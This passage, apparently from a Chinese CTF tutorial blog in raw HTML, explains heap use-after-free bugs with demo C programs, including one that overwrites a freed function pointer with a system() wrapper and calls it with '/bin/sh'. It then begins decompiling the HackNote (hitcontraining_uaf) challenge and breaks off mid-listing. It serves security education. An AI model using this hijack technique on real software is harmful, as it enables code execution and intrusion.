punctuation\">(</span><span class=\"token string\">\"%s\\n\"</span><span class=\"token punctuation\">,</span> str<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span> <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre><span class=\"token keyword\">void</span> <span class=\"token function\">printmyname</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span> <span class=\"token function\">printf</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"call print my name\\n\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span> <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre><span class=\"token keyword\">int</span> <span class=\"token function\">main</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>  NAME <span class=\"token operator\">*</span>a<span class=\"token punctuation\">;</span> <span class=\"token comment\">//</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>  a <span class=\"token operator\">=</span> <span class=\"token punctuation\">(</span>NAME <span class=\"token operator\">*</span><span class=\"token punctuation\">)</span><span class=\"token function\">malloc</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">sizeof</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">struct</span> <span class=\"token class-name\">name</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre>  a<span class=\"token operator\">-></span>func <span class=\"token operator\">=</span> myprint<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre>  a<span class=\"token operator\">-></span>myname <span class=\"token operator\">=</span> <span class=\"token string\">\"I can also use it\"</span><span class=\"token punctuation\">;</span>  <span class=\"token comment\">// 这里的是字符串指针没有被打印</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre>  a<span class=\"token operator\">-></span><span class=\"token function\">func</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"this is my function\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre>  <span class=\"token comment\">// free without modify</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre>  <span class=\"token function\">free</span><span class=\"token punctuation\">(</span>a<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"17\"></td><td><pre>  a<span class=\"token operator\">-></span><span class=\"token function\">func</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"I can also use it\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span> <span class=\"token comment\">// 释放之后仍然能够调用函数就是因为指针没被置空，这里的 func=myprint, 后面的为参数</span></pre></td></tr><tr><td data-num=\"18\"></td><td><pre>  <span class=\"token comment\">// free with modify</span></pre></td></tr><tr><td data-num=\"19\"></td><td><pre></pre></td></tr><tr><td data-num=\"20\"></td><td><pre>  a<span class=\"token operator\">-></span>func <span class=\"token operator\">=</span> printmyname<span class=\"token punctuation\">;</span><span class=\"token comment\">// 仅仅是对函数的调用了，而是直接将 func 成员变量中的函数指针更改成了 printmyname () 函数，并且调用 func 成员变量。</span></pre></td></tr><tr><td data-num=\"21\"></td><td><pre>  <span class=\"token comment\">// 虽然 printmyname () 函数不需要参数，但为了能够让程序认为这里依然是 myprint () 函数，并且认为我们的操作是合法的，所以传入了参数 \"this is my function\"。</span></pre></td></tr><tr><td data-num=\"22\"></td><td><pre>  a<span class=\"token operator\">-></span><span class=\"token function\">func</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"this is my function\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span><span class=\"token comment\">// 这里的就没有被打印，因为函数已经更改没有参数输出；</span></pre></td></tr><tr><td data-num=\"23\"></td><td><pre></pre></td></tr><tr><td data-num=\"24\"></td><td><pre>  <span class=\"token comment\">// set NULL</span></pre></td></tr><tr><td data-num=\"25\"></td><td><pre>  a <span class=\"token operator\">=</span> <span class=\"token constant\">NULL</span><span class=\"token punctuation\">;</span>    <span class=\"token comment\">// 这里就将函数指针置空了</span></pre></td></tr><tr><td data-num=\"26\"></td><td><pre>  <span class=\"token function\">printf</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"this pogram will crash...\\n\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"27\"></td><td><pre>  a<span class=\"token operator\">-></span><span class=\"token function\">func</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"can not be printed...\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>  <span class=\"token comment\">// 指针置空后就无法再调用了，就会保报错</span></pre></td></tr><tr><td data-num=\"28\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr></table></figure><p>运行结果：</p>\n<pre><code>➜  use_after_free git:(use_after_free) ✗ ./use_after_free                      \nthis is my function\n\nI can also use it         #释放后调用\ncall print my name   #释放后调用\nthis pogram will crash...   \n[1]    38738 segmentation fault (core dumped)  ./use_after_free    #这里的报错是指针置空后再调用引起的\n</code></pre>\n<p>这里我们就发现了，因为没有被置空所以我们能接着用指针内的函数指针来执行对应操作，但是置空后就会报错</p>\n<h2 id=\"一般利用\"><a class=\"anchor\" href=\"#一般利用\">#</a> 一般利用：</h2>\n<p>在申请了一个堆块后，当我们执行了 free 来释放它，但是如果我们没有将这个指针 <code>置空</code> 时，由于 <code>fastbin</code>  我们下一次申请通样大小的堆块，则会申请到上次同一个堆，这时 <code>上一次的堆指针</code> 因为没有被置空则仍然可以访问第二次申请的堆，这样两个指针就指向的是同一个堆块，我们就能够利用</p>\n<pre><code>应用程序调用free()释放内存时，如果内存块小于256kb，\ndlmalloc并不马上将内存块释放回内存，而是将内存块标记为空闲状态。\n这么做的原因有两个：\n一是内存块不一定能马上释放会内核（比如内存块不是位于堆顶端）\n二是供应用程序下次申请内存使用（这是主要原因）。\n当dlmalloc中空闲内存量达到一定值时dlmalloc才将空闲内存释放会内核。\n如果应用程序申请的内存大于256kb，dlmalloc调用mmap()向内核申请一块内存，返回返还给应用程序使用。\n如果应用程序释放的内存大于256kb，dlmalloc马上调用munmap()释放内存。\ndlmalloc不会缓存大于256kb的内存块，因为这样的内存块太大了，最好不要长期占用这么大的内存资源。\n</code></pre>\n<p>这里利用别人的示例代码进行说明：</p>\n<p>原文章地址：<br />\n<span class=\"exturl\" data-url=\"aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzMxNDgxMTg3L2FydGljbGUvZGV0YWlscy83MzYxMjQ1MQ==\">https://blog.csdn.net/qq_31481187/article/details/73612451</span></p>\n<figure class=\"highlight c\"><figcaption data-lang=\"c\"><span>c</span></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token macro property\"><span class=\"token directive-hash\">#</span><span class=\"token directive keyword\">include</span> <span class=\"token string\">&lt;stdio.h></span></span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token macro property\"><span class=\"token directive-hash\">#</span><span class=\"token directive keyword\">include</span> <span class=\"token string\">&lt;stdlib.h></span></span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token keyword\">typedef</span> <span class=\"token keyword\">void</span> <span class=\"token punctuation\">(</span><span class=\"token operator\">*</span>func_ptr<span class=\"token punctuation\">)</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">char</span> <span class=\"token operator\">*</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre><span class=\"token keyword\">void</span> <span class=\"token function\">evil_fuc</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">char</span> command<span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre><span class=\"token function\">system</span><span class=\"token punctuation\">(</span>command<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre><span class=\"token keyword\">void</span> <span class=\"token function\">echo</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">char</span> content<span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre><span class=\"token function\">printf</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"%s\"</span><span class=\"token punctuation\">,</span>content<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre><span class=\"token keyword\">int</span> <span class=\"token function\">main</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre>    func_ptr <span class=\"token operator\">*</span>p1<span class=\"token operator\">=</span><span class=\"token punctuation\">(</span>func_ptr<span class=\"token operator\">*</span><span class=\"token punctuation\">)</span><span class=\"token function\">malloc</span><span class=\"token punctuation\">(</span><span class=\"token number\">4</span><span class=\"token operator\">*</span><span class=\"token keyword\">sizeof</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">int</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre>    <span class=\"token function\">printf</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"malloc addr: %p\\n\"</span><span class=\"token punctuation\">,</span>p1<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre>    p1<span class=\"token punctuation\">[</span><span class=\"token number\">3</span><span class=\"token punctuation\">]</span><span class=\"token operator\">=</span>echo<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"17\"></td><td><pre>    p1<span class=\"token punctuation\">[</span><span class=\"token number\">3</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"hello world\\n\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"18\"></td><td><pre>    <span class=\"token function\">free</span><span class=\"token punctuation\">(</span>p1<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span> <span class=\"token comment\">// 在这里 free 了 p1, 但并未将 p1 置空，导致后续可以再使用 p1 指针</span></pre></td></tr><tr><td data-num=\"19\"></td><td><pre>    p1<span class=\"token punctuation\">[</span><span class=\"token number\">3</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"hello again\\n\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span> <span class=\"token comment\">//p1 指针未被置空，虽然 free 了，但仍可使用.</span></pre></td></tr><tr><td data-num=\"20\"></td><td><pre>    func_ptr <span class=\"token operator\">*</span>p2<span class=\"token operator\">=</span><span class=\"token punctuation\">(</span>func_ptr<span class=\"token operator\">*</span><span class=\"token punctuation\">)</span><span class=\"token function\">malloc</span><span class=\"token punctuation\">(</span><span class=\"token number\">4</span><span class=\"token operator\">*</span><span class=\"token keyword\">sizeof</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">int</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span><span class=\"token comment\">//malloc 在 free 一块内存后，再次申请同样大小的指针会把刚刚释放的内存分配出来.</span></pre></td></tr><tr><td data-num=\"21\"></td><td><pre>    <span class=\"token function\">printf</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"malloc addr: %p\\n\"</span><span class=\"token punctuation\">,</span>p2<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"22\"></td><td><pre>    <span class=\"token function\">printf</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"malloc addr: %p\\n\"</span><span class=\"token punctuation\">,</span>p1<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span><span class=\"token comment\">//p2 与 p1 指针指向的内存为同一地址</span></pre></td></tr><tr><td data-num=\"23\"></td><td><pre>    p2<span class=\"token punctuation\">[</span><span class=\"token number\">3</span><span class=\"token punctuation\">]</span><span class=\"token operator\">=</span>evil_fuc<span class=\"token punctuation\">;</span> <span class=\"token comment\">// 在这里将 p1 指针里面保存的 echo 函数指针覆盖成为了 evil_func 指针.</span></pre></td></tr><tr><td data-num=\"24\"></td><td><pre>    p1<span class=\"token punctuation\">[</span><span class=\"token number\">3</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"/bin/sh\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"25\"></td><td><pre>    <span class=\"token keyword\">return</span> <span class=\"token number\">0</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"26\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr></table></figure><p><img data-src=\"https://img-blog.csdn.net/20170623001441464?watermark/2/text/aHR0cDovL2Jsb2cuY3Nkbi5uZXQvcXFfMzE0ODExODc=/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70/gravity/SouthEast\" alt=\"\" /></p>\n<p>这里我们可以看见指针没有被置空导致仍然能够向 <code>p1</code>  中改写参数，并且可以调用对应的函数；如果置空时我们就要重新申请堆，这时就无法改写前面堆内部的值</p>\n<h1 id=\"例题hitcontraining_uafuse-after-free\"><a class=\"anchor\" href=\"#例题hitcontraining_uafuse-after-free\">#</a> 例题：hitcontraining_uaf（use after free）</h1>\n<h2 id=\"1程序分析\"><a class=\"anchor\" href=\"#1程序分析\">#</a> 1. 程序分析</h2>\n<p>32 位程序，开了 NX</p>\n<p><img data-src=\"https://z1.ax1x.com/2023/10/01/pPqvvhF.png\" alt=\"\" /></p>\n<p>伪源码：</p>\n<p><code>main</code></p>\n<figure class=\"highlight c\"><figcaption data-lang=\"c\"><span>c</span></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">int</span> __cdecl __noreturn <span class=\"token function\">main</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">int</span> argc<span class=\"token punctuation\">,</span> <span class=\"token keyword\">const</span> <span class=\"token keyword\">char</span> <span class=\"token operator\">*</span><span class=\"token operator\">*</span>argv<span class=\"token punctuation\">,</span> <span class=\"token keyword\">const</span> <span class=\"token keyword\">char</span> <span class=\"token operator\">*</span><span class=\"token operator\">*</span>envp<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>  <span class=\"token keyword\">int</span> v3<span class=\"token punctuation\">;</span> <span class=\"token comment\">// eax</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>  <span class=\"token keyword\">char</span> buf<span class=\"token punctuation\">[</span><span class=\"token number\">4</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span> <span class=\"token comment\">// [esp+0h] [ebp-Ch] BYREF</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>  <span class=\"token keyword\">int</span> <span class=\"token operator\">*</span>v5<span class=\"token punctuation\">;</span> <span class=\"token comment\">// [esp+4h] [ebp-8h]</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>  v5 <span class=\"token operator\">=</span> <span class=\"token operator\">&amp;</span>argc<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>  <span class=\"token function\">setvbuf</span><span class=\"token punctuation\">(</span><span class=\"token constant\">stdout</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0</span><span class=\"token punctuation\">,</span> <span class=\"token number\">2</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>  <span class=\"token function\">setvbuf</span><span class=\"token punctuation\">(</span><span class=\"token constant\">stdin</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0</span><span class=\"token punctuation\">,</span> <span class=\"token number\">2</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>  <span class=\"token keyword\">while</span> <span class=\"token punctuation\">(</span> <span class=\"token number\">1</span> <span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>  <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre>    <span class=\"token keyword\">while</span> <span class=\"token punctuation\">(</span> <span class=\"token number\">1</span> <span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre>    <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre>      <span class=\"token function\">menu</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre>      <span class=\"token function\">read</span><span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">,</span> buf<span class=\"token punctuation\">,</span> <span class=\"token number\">4u</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre>      v3 <span class=\"token operator\">=</span> <span class=\"token function\">atoi</span><span class=\"token punctuation\">(</span>buf<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"17\"></td><td><pre>      <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span> v3 <span class=\"token operator\">!=</span> <span class=\"token number\">2</span> <span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"18\"></td><td><pre>        <span class=\"token keyword\">break</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"19\"></td><td><pre>      <span class=\"token function\">del_note</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"20\"></td><td><pre>    <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"21\"></td><td><pre>    <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span> v3 <span class=\"token operator\">></span> <span class=\"token number\">2</span> <span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"22\"></td><td><pre>    <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"23\"></td><td><pre>      <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span> v3 <span class=\"token operator\">==</span> <span class=\"token number\">3</span> <span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"24\"></td><td><pre>      <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"25\"></td><td><pre>        <span class=\"token function\">print_note</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"26\"></td><td><pre>      <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"27\"></td><td><pre>      <span class=\"token keyword\">else</span></pre></td></tr><tr><td data-num=\"28\"></td><td><pre>      <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"29\"></td><td><pre>        <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span> v3 <span class=\"token operator\">==</span> <span class=\"token number\">4</span> <span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"30\"></td><td><pre>          <span class=\"token function\">exit</span><span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"31\"></td><td><pre>LABEL_13<span class=\"token operator\">:</span></pre></td></tr><tr><td data-num=\"32\"></td><td><pre>        <span class=\"token function\">puts</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"Invalid choice\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"33\"></td><td><pre>      <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"34\"></td><td><pre>    <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"35\"></td><td><pre>    <span class=\"token keyword\">else</span></pre></td></tr><tr><td data-num=\"36\"></td><td><pre>    <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"37\"></td><td><pre>      <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span> v3 <span class=\"token operator\">!=</span> <span class=\"token number\">1</span> <span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"38\"></td><td><pre>        <span class=\"token keyword\">goto</span> LABEL_13<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"39\"></td><td><pre>      <span class=\"token function\">add_note</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"40\"></td><td><pre>    <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"41\"></td><td><pre>  <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"42\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr></table></figure><p><code>menu：</code></p>\n<figure class=\"highlight c\"><figcaption data-lang=\"c\"><span>c</span></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">int</span> <span class=\"token function\">menu</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>  <span class=\"token function\">puts</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"----------------------\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>  <span class=\"token function\">puts</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"       HackNote       \"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>  <span class=\"token function\">puts</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"----------------------\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>  <span class=\"token function\">puts</span><span class=\"token punctuation\">(</span><span class=\"token string\">\" 1. Add note          \"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>  <span class=\"token function\">puts</span><span class=\"token punctuation\">(</span><span class=\"token string\">\" 2. Delete note       \"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>  <span class=\"token function\">puts</span><span class=\"token punctuation\">(</span><span class=\"token string\">\" 3. Print note        \"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>  <span class=\"token function\">puts</span><span class=\"token punctuation\">(</span><span class=\"token string\">\" 4. Exit              \"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>  <span class=\"token function\">puts</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"----------------------\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>  <span class=\"token keyword\">return</span> <span class=\"token function\">printf</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"Your choice :\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr></table></figure><p><code>del_note：</code></p>\n<figure class=\"highlight c\"><figcaption data-lang=\"c\"><span>c</span></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">int</span> <span class=\"token function\">del_note</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>  <span class=\"token keyword\">int</span> result<span class=\"token punctuation\">;</span> <span class=\"token comment\">// eax</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>  <span class=\"token keyword\">char</span> buf<span class=\"token punctuation\">[</span><span class=\"token number\">4</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span> <span class=\"token comment\">// [esp+8h] [ebp-10h] BYREF</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>  <span class=\"token keyword\">int</span> v2<span class=\"token punctuation\">;</span> <span class=\"token comment\">// [esp+Ch] [ebp-Ch]</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>  <span class=\"token function\">printf</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"Index :\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>  <span class=\"token function\">read</span><span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">,</span> buf<span class=\"token punctuation\">,</span> <span class=\"token number\">4u</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>  v2 <span class=\"token operator\">=</span> <span class=\"token function\">atoi</span><span class=\"token punctuation\">(</span>buf<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>  <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span> v2 <span class=\"token operator\">&lt;</span> <span class=\"token number\">0</span> <span class=\"token operator\">||</span> v2 <span class=\"token operator\">>=</span> count <span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>  <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre>    <span class=\"token function\">puts</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"Out of bound!\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre>    <span class=\"token function\">_exit</span><span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre>  <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre>  result <span class=\"token operator\">=</span> <span class=\"token operator\">*</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span>_DWORD <span class=\"token operator\">*</span><span class=\"token punctuation\">)</span><span class=\"token operator\">&amp;</span>notelist <span class=\"token operator\">+</span> v2<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre>  <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span> result <span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"17\"></td><td><pre>  <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"18\"></td><td><pre>    <span class=\"token function\">free</span><span class=\"token punctuation\">(</span><span class=\"token operator\">*</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">void</span> <span class=\"token operator\">*</span><span class=\"token operator\">*</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">(</span><span class=\"token operator\">*</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span>_DWORD <span class=\"token operator\">*</span><span class=\"token punctuation\">)</span><span class=\"token operator\">&amp;</span>notelist <span class=\"token operator\">+</span> v2<span class=\"token punctuation\">)</span> <span class=\"token operator\">+</span> <span class=\"token number\">4</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"19\"></td><td><pre>    <span class=\"token function\">free</span><span class=\"token punctuation\">(</span><span class=\"token operator\">*</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">void</span> <span class=\"token operator\">*</span><span class=\"token operator\">*</span><span class=\"token punctuation\">)</span><span class=\"token operator\">&amp;</span>notelist <span class=\"token operator\">+</span> v2<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"20\"></td><td><pre>    result <span class=\"token operator\">=</span> <span class=\"token function\">puts</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"Success\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"21\"></td><td><pre>  <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"22\"></td><td><pre>  <span class=\"token keyword\">return</span> result<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"23\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr></table></figure><p><code>print_note：</code></p>\n<figure class=\"highlight 